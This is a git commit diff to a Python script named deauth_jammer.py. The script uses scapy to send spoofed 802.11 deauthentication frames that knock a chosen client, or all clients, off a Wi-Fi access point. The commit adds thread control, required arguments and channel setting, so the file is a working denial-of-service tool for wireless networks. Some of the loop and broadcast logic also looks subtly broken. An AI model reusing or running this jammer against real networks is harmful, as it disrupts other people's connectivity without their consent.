430aba2f92ad5eda9eb367b3ca14c008bd641a57
Florian Loch <florian.loch@gmail.com>
2016-12-18 17:58:21 +0100

    Some fixes with thread handling to be able to interrupt execution. Working now

--- deauth_jammer.py
+++ deauth_jammer.py
@@ -16,6 +16,8 @@ class DeauthJammer(object):
     def __init__(self, ap_bssid, iface="wlan0mon"):
         self._ap_bssid = ap_bssid
         self._threads = []
+        self._thread_event = threading.Event()
+        self._thread_event.set()
         # scapy.conf.iface =
         atexit.register(self._on_end)
         scapy.conf.iface = iface
@@ -23,7 +25,9 @@ class DeauthJammer(object):
 
     def jam(self, targets, packet_count=1):
         if type(targets) is types.StringType:
-            targets = list(targets)
+            old_targets = targets
+            targets = list()
+            targets.append(old_targets)
 
         assert type(targets) is types.ListType
 
@@ -33,8 +37,16 @@ class DeauthJammer(object):
             self._threads.append(jamThread)
             jamThread.start()
 
+        print "Number of operating threads : " + str(threading.activeCount())
+        try:
+            while threading.activeCount() > 1:
+                for thread in self._threads:
+                    thread.join(.1)
+        except KeyboardInterrupt:
+            self._on_end()
+
     def _deauth_target(self, target, packet_count):
-        broadcast = target.lowercase() != 'FF:FF:FF:FF:FF:FF'
+        broadcast = target.lower() != 'FF:FF:FF:FF:FF:FF'
         ap_to_client_pckt = scapy.Dot11(addr1=target, addr2=self._ap_bssid,
                                         addr3=self._ap_bssid) / scapy.Dot11Deauth()
         client_to_ap_pckt = None
@@ -42,25 +54,33 @@ class DeauthJammer(object):
             client_to_ap_pckt = scapy.Dot11(
                 addr1=self._ap_bssid, addr2=target, addr3=self._ap_bssid) / scapy.Dot11Deauth()
 
-        for n in range(packet_count):
+        actually_sent = 0
+        for n in range(packet_count) or packet_count == -1:
+            if not self._thread_event.isSet():
+                break
+
             scapy.send(ap_to_client_pckt)
 
+            # Seems not to be neccessary
             if not broadcast:
                 scapy.send(client_to_ap_pckt)
 
-        print "Sent " + str(packet_count) + " packets to " + target
+            actually_sent = n
+
+        print "Sent " + str(actually_sent + 1) + " packets to " + target
 
     def _on_end(self):
+        self._thread_event.clear()
         for thread in self._threads:
-            thread.join
+            thread.join()
 
 if __name__ == '__main__':
     arg_parser = argparse.ArgumentParser()
-    arg_parser.add_argument("-a, --bssid", dest="bssid",
+    arg_parser.add_argument("-a, --bssid", dest="bssid", required=True,
                             help="BSSID of ap that inadvertently closes the connection", metavar="BSSID")
-    arg_parser.add_argument("-t, --client_mac", dest="client_mac",
+    arg_parser.add_argument("-t, --client_mac", dest="client_mac", required=True,
                             help="Target of deauthentification", metavar="CLIENT_MAC")
-    arg_parser.add_argument("-c, --channel", dest="channel",
+    arg_parser.add_argument("-c, --channel", dest="channel", required=True,
                             help="Channel on which the network operates", metavar="CHANNEL")
     arg_parser.add_argument("-n", dest="count", default="64",
                             help="Amount of deauth-packages to be sent", metavar="COUNT")
@@ -69,6 +89,7 @@ if __name__ == '__main__':
 
     parsed_options = arg_parser.parse_args()
     parsed_options.count = int(parsed_options.count)
+    parsed_options.channel = int(parsed_options.channel)
 
     os.system("iwconfig %s channel %d" %
               (parsed_options.iface, parsed_options.channel))
